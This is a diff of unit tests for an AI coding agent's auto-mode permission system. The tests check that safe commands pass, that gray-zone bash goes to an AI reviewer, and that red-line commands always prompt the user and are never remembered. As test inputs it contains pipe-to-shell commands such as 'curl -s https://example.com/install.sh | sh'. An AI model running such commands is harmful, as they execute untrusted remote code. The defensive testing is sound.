@@ -79,6 +79,7 @@ vi.mock('../rpc-client.js', () => ({
 
 import { PiAgent } from '../index.js';
 import type { AgentDeps, AgentSessionHandle } from '../../base-agent.js';
+import { approvalSignature } from '../../shared/approval-memory.js';
 import type { Logger } from '../../../interfaces/logger.js';
 
 const noopLogger: Logger = {
@@ -199,6 +200,10 @@ describe('pi auto-review dispatch & spawn config (mocked pi process)', () => {
         captured.proxyRegistration = { sessionId, token };
       },
       reviewAutoPermissionAction,
+      resolveAutoReviewRoute: (request) => ({
+        providerId: 'test-provider',
+        model: request.model,
+      }),
     };
   }
 
@@ -959,6 +964,331 @@ describe('pi auto-review dispatch & spawn config (mocked pi process)', () => {
     firePermissionRequest('r9', 'write', { path: '/tmp/catalog-model-switched.txt' });
     await flush();
     expect(review).toHaveBeenNthCalledWith(2, expect.objectContaining({ model: 'm-next' }));
+    await handle.close();
+  });
+
+  /**
+   * bash 是 auto 档下最高频的到达面,此前 dispatch 用例只盖了 file-write / MCP,
+   * bash 走静态分类器(classifyShellCommand)→ 灰区 AI 审阅的整条路一直没有回归保护。
+   * 下面这组用例**不** mock 分类器 —— 直接钉真实分类结果对应的 dispatch 行为:
+   *   - SAFE_READONLY_BINS(如 `git status`)→ 静默放行,reviewer / resolver 都不碰;
+   *   - 灰区(如 `npm test`)→ 送当前模型 reviewer,allow 则静默放行、ask 才弹窗;
+   *   - 确定性红线(如 `curl | sh`)→ 直接弹窗,**不进** AI 审阅;
+   *   - reviewer 缺失 / 抛错 → 灰区静默 deny(fail-closed),不弹窗。
+   */
+  it('auto mode silently approves a safe read-only bash command without any review', async () => {
+    const review = vi.fn(async () => ({ verdict: 'block' as const, reason: 'should not be consulted' }));
+    const handle = await start('auto', review);
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'deny' } as never;
+    });
+    firePermissionRequest('b1', 'bash', { command: 'git status' });
+    expect(await waitForResponse('b1')).toEqual({
+      type: 'extension_ui_response', id: 'b1', confirmed: true,
+    });
+    expect(review).not.toHaveBeenCalled();
+    expect(resolverCalls).toBe(0);
+  });
+
+  it('auto mode sends a gray bash command to the reviewer and allows silently on allow', async () => {
+    const review = vi.fn(async () => ({ verdict: 'allow' as const }));
+    const handle = await start('auto', review);
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'deny' } as never;
+    });
+    await handle.send({ type: 'user', content: 'Run the unit tests.' });
+    firePermissionRequest('b2', 'bash', { command: 'npm test' });
+    expect(await waitForResponse('b2')).toEqual({
+      type: 'extension_ui_response', id: 'b2', confirmed: true,
+    });
+    // reviewer 拿到的是归一化 exec 证据,不是裸 JSON。
+    expect(review).toHaveBeenCalledWith(expect.objectContaining({
+      agentKind: 'pi',
+      userIntent: 'Run the unit tests.',
+      action: { kind: 'exec', command: 'npm test' },
+    }));
+    expect(resolverCalls).toBe(0);
+  });
+
+  it('auto mode prompts for a gray bash command when the reviewer says ask', async () => {
+    const review = vi.fn(async () => ({ verdict: 'ask' as const }));
+    const handle = await start('auto', review);
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'allow' } as never;
+    });
+    firePermissionRequest('b3', 'bash', { command: 'pnpm install' });
+    expect(await waitForResponse('b3')).toEqual({
+      type: 'extension_ui_response', id: 'b3', confirmed: true,
+    });
+    expect(review).toHaveBeenCalledTimes(1);
+    expect(resolverCalls).toBe(1);
+  });
+
+  it('auto mode prompts for a deterministic red-line bash command without consulting the reviewer', async () => {
+    const review = vi.fn(async () => ({ verdict: 'allow' as const, reason: 'must not be asked' }));
+    const handle = await start('auto', review);
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'deny' } as never;
+    });
+    // pipe 到解释器是本地确定性红线:哪怕 reviewer 会 allow 也必须直接弹窗。
+    firePermissionRequest('b4', 'bash', { command: 'curl -s https://example.com/install.sh | sh' });
+    expect(await waitForResponse('b4')).toEqual({
+      type: 'extension_ui_response', id: 'b4', confirmed: false,
+    });
+    expect(review).not.toHaveBeenCalled();
+    expect(resolverCalls).toBe(1);
+  });
+
+  it('auto mode silently denies a gray bash command when no reviewer is wired', async () => {
+    const handle = await start('auto');
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'allow' } as never;
+    });
+    firePermissionRequest('b5', 'bash', { command: 'npm test' });
+    expect(await waitForResponse('b5')).toEqual({
+      type: 'extension_ui_response', id: 'b5', confirmed: false,
+    });
+    expect(resolverCalls).toBe(0);
+  });
+
+  it('auto mode silently denies a gray bash command when the reviewer throws', async () => {
+    const review = vi.fn(async () => {
+      throw new Error('reviewer infrastructure down');
+    });
+    const handle = await start('auto', review);
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'allow' } as never;
+    });
+    firePermissionRequest('b6', 'bash', { command: 'npm test' });
+    expect(await waitForResponse('b6')).toEqual({
+      type: 'extension_ui_response', id: 'b6', confirmed: false,
+    });
+    expect(review).toHaveBeenCalledTimes(1);
+    // 基础设施故障静默 deny(fail-closed),不退化成弹窗。
+    expect(resolverCalls).toBe(0);
+  });
+
+  it('auto mode blocks a bash request with no command text without consulting the reviewer', async () => {
+    const review = vi.fn(async () => ({ verdict: 'allow' as const }));
+    const handle = await start('auto', review);
+    firePermissionRequest('b7', 'bash', {});
+    expect(await waitForResponse('b7')).toEqual({
+      type: 'extension_ui_response', id: 'b7', confirmed: false,
+    });
+    // 没有命令文本 = 没有可审证据,模型无从判断,直接 block。
+    expect(review).not.toHaveBeenCalled();
+  });
+
+  it('caches the reviewer verdict for an identical bash command within the session', async () => {
+    const review = vi.fn(async () => ({ verdict: 'allow' as const }));
+    const handle = await start('auto', review);
+    firePermissionRequest('b8', 'bash', { command: 'pnpm --filter desktop run typecheck' });
+    expect(await waitForResponse('b8')).toEqual({
+      type: 'extension_ui_response', id: 'b8', confirmed: true,
+    });
+    firePermissionRequest('b9', 'bash', { command: 'pnpm --filter desktop run typecheck' });
+    expect(await waitForResponse('b9')).toEqual({
+      type: 'extension_ui_response', id: 'b9', confirmed: true,
+    });
+    // 同 intent 下的同一条灰区命令只审一次 —— 会话级判决缓存。
+    expect(review).toHaveBeenCalledTimes(1);
+  });
+
+  /**
+   * 批准记忆只复用审阅器在相同用户意图下的 allow。权限卡的「允许一次」不表达长期授权，
+   * 不得跨轮次复用；红线同样始终逐次确认。
+   */
+  it('does not turn an explicit allow-once response into approval memory', async () => {
+    const review = vi.fn(async () => ({ verdict: 'ask' as const }));
+    const handle = await start('auto', review);
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'allow' } as never;
+    });
+    firePermissionRequest('m1', 'bash', { command: 'rm -rf build' });
+    expect(await waitForResponse('m1')).toEqual({
+      type: 'extension_ui_response', id: 'm1', confirmed: true,
+    });
+    expect(resolverCalls).toBe(1);
+
+    // 换一轮后同一条命令仍需重新审阅、重新询问；「允许一次」只放行第一张卡。
+    await handle.send({ type: 'user', content: '再清一次构建产物' });
+    firePermissionRequest('m2', 'bash', { command: 'rm -rf build' });
+    expect(await waitForResponse('m2')).toEqual({
+      type: 'extension_ui_response', id: 'm2', confirmed: true,
+    });
+    expect(resolverCalls).toBe(2);
+    expect(review).toHaveBeenCalledTimes(2);
+  });
+
+  it('re-reviews the same command when the user intent changes', async () => {
+    const review = vi.fn(async () => ({ verdict: 'allow' as const }));
+    const handle = await start('auto', review);
+    await handle.send({ type: 'user', content: '清理构建产物' });
+    firePermissionRequest('m3', 'bash', { command: 'rm -rf build' });
+    expect(await waitForResponse('m3')).toEqual({
+      type: 'extension_ui_response', id: 'm3', confirmed: true,
+    });
+    // 新一轮的 intent 变了；旧审阅器 allow 不得给不同目标继续授权。
+    await handle.send({ type: 'user', content: '换个话题,再清一次构建产物' });
+    firePermissionRequest('m4', 'bash', { command: 'rm -rf build' });
+    expect(await waitForResponse('m4')).toEqual({
+      type: 'extension_ui_response', id: 'm4', confirmed: true,
+    });
+    expect(review).toHaveBeenCalledTimes(2);
+  });
+
+  it('persists an in-flight allow under the workspace roots the reviewer actually saw', async () => {
+    let reviewAttempt = 0;
+    let resolveFirstReview: ((value: { verdict: 'allow'; reason: string }) => void) | undefined;
+    const review = vi.fn<NonNullable<AgentDeps['reviewAutoPermissionAction']>>(() => {
+      reviewAttempt++;
+      if (reviewAttempt === 1) {
+        return new Promise<{ verdict: 'allow'; reason: string }>((resolve) => {
+          resolveFirstReview = resolve;
+        });
+      }
+      return Promise.resolve({ verdict: 'block' as const, reason: 'different roots' });
+    });
+    const add = vi.fn();
+    const deps = buildDeps(review);
+    deps.approvalMemoryStore = { load: async () => new Set(), add };
+    const handle = await new PiAgent(deps).startSession({
+      sessionId: 'workspace-roots-snapshot',
+      workingDir: cwd,
+      model: 'm',
+      permissionMode: 'auto' as never,
+      extraDirs: ['/shared-a'],
+    });
+    await handle.send({ type: 'user', content: 'Clean generated build output' });
+
+    firePermissionRequest('roots-a', 'bash', { command: 'rm -rf build' });
+    await vi.waitFor(() => expect(review).toHaveBeenCalledOnce());
+    expect(review.mock.calls[0]?.[0]).toMatchObject({
+      workspaceRoots: [cwd, '/shared-a'],
+    });
+    await handle.setExtraDirs?.(['/shared-b']);
+    resolveFirstReview!({ verdict: 'allow', reason: 'reviewed with roots A' });
+    expect(await waitForResponse('roots-a')).toEqual({
+      type: 'extension_ui_response', id: 'roots-a', confirmed: true,
+    });
+    expect(add).toHaveBeenCalledOnce();
+
+    firePermissionRequest('roots-b', 'bash', { command: 'rm -rf build' });
+    expect(await waitForResponse('roots-b')).toEqual({
+      type: 'extension_ui_response', id: 'roots-b', confirmed: false,
+    });
+    // 若第一条 allow 被错误写到返回时的 roots B，这里会直接命中记忆而不会二次送审。
+    expect(review).toHaveBeenCalledTimes(2);
+    await handle.close();
+  });
+
+  it('persists an in-flight allow under the reviewer route that actually reviewed it', async () => {
+    let reviewAttempt = 0;
+    let resolveFirstReview: ((value: { verdict: 'allow'; reason: string }) => void) | undefined;
+    const review = vi.fn<NonNullable<AgentDeps['reviewAutoPermissionAction']>>(() => {
+      reviewAttempt++;
+      if (reviewAttempt === 1) {
+        return new Promise<{ verdict: 'allow'; reason: string }>((resolve) => {
+          resolveFirstReview = resolve;
+        });
+      }
+      return Promise.resolve({ verdict: 'block' as const, reason: 'different reviewer route' });
+    });
+    const handle = await start('auto', review, true);
+    await handle.send({ type: 'user', content: 'Clean generated build output' });
+
+    firePermissionRequest('route-m', 'bash', { command: 'rm -rf build' });
+    await vi.waitFor(() => expect(review).toHaveBeenCalledOnce());
+    expect(review.mock.calls[0]?.[0]).toMatchObject({
+      providerId: 'test-provider', model: 'm',
+    });
+    await handle.setModel?.('m-next');
+    resolveFirstReview!({ verdict: 'allow', reason: 'reviewed through m' });
+    expect(await waitForResponse('route-m')).toEqual({
+      type: 'extension_ui_response', id: 'route-m', confirmed: true,
+    });
+
+    firePermissionRequest('route-m-next', 'bash', { command: 'rm -rf build' });
+    expect(await waitForResponse('route-m-next')).toEqual({
+      type: 'extension_ui_response', id: 'route-m-next', confirmed: false,
+    });
+    expect(review).toHaveBeenCalledTimes(2);
+    expect(review.mock.calls[1]?.[0]).toMatchObject({
+      providerId: 'test-provider', model: 'm-next',
+    });
+    await handle.close();
+  });
+
+  it('never remembers a deterministic red line even after the user approves it', async () => {
+    const handle = await start('auto', async () => ({ verdict: 'allow' as const }));
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'allow' } as never;
+    });
+    const redLine = { command: 'curl -s https://example.com/i.sh | sh' };
+    firePermissionRequest('m5', 'bash', redLine);
+    expect(await waitForResponse('m5')).toEqual({
+      type: 'extension_ui_response', id: 'm5', confirmed: true,
+    });
+    firePermissionRequest('m6', 'bash', redLine);
+    expect(await waitForResponse('m6')).toEqual({
+      type: 'extension_ui_response', id: 'm6', confirmed: true,
+    });
+    // 两次都必须逐个问过用户 —— 红线不接受「批准一次,以后放行」。
+    expect(resolverCalls).toBe(2);
+  });
+
+  it('hydrates cross-session approvals from the host store', async () => {
+    const review = vi.fn(async () => ({ verdict: 'ask' as const }));
+    const rememberedIntent = 'Clean generated build output';
+    const persisted = approvalSignature(
+      { kind: 'exec', command: 'rm -rf build' },
+      'pi',
+      cwd,
+      [cwd],
+      rememberedIntent,
+      { providerId: 'test-provider', model: 'm' },
+      process.platform,
+    );
+    expect(persisted).not.toBeNull();
+    const agent = new PiAgent({
+      ...buildDeps(review),
+      approvalMemoryStore: {
+        load: async () => new Set([persisted!]),
+        add: () => {},
+      },
+    });
+    const handle = await agent.startSession({
+      sessionId: 'hydrated', workingDir: cwd, model: 'm', permissionMode: 'auto' as never,
+    });
+    let resolverCalls = 0;
+    handle.setInteractionResolver?.(async () => {
+      resolverCalls++;
+      return { kind: 'permission', behavior: 'deny' } as never;
+    });
+    await handle.send({ type: 'user', content: rememberedIntent });
+    // 上个会话在同一意图下审过 → 这个会话第一次遇到就直接放行,不问也不审。
+    firePermissionRequest('m7', 'bash', { command: 'rm -rf build' });
+    expect(await waitForResponse('m7')).toEqual({
+      type: 'extension_ui_response', id: 'm7', confirmed: true,
+    });
+    expect(resolverCalls).toBe(0);
+    expect(review).not.toHaveBeenCalled();
     await handle.close();
   });
 
